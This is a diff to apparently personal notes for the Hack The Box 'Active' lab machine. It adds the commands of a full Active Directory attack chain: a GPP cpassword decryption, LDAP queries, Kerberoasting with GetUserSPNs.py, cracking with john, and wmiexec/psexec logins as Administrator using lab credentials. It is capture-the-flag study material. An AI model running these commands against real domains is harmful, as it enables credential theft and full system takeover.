@@ -36,10 +36,10 @@ https://0xdf.gitlab.io/2018/12/08/htb-active.html
 ```
 enum4linux 10.10.10.100
 smbclient \\\\10.10.10.100\\Replication
-gpp-decrypt
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
-cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
-john hashadmin -w=/usr/share/wordlists/rockyou.txt
+./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
+john hash_admin -w=/usr/share/wordlists/rockyou.txt
 ./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
 ./psexec.py Administrator:Ticketmaster1968@10.10.10.100
 ```
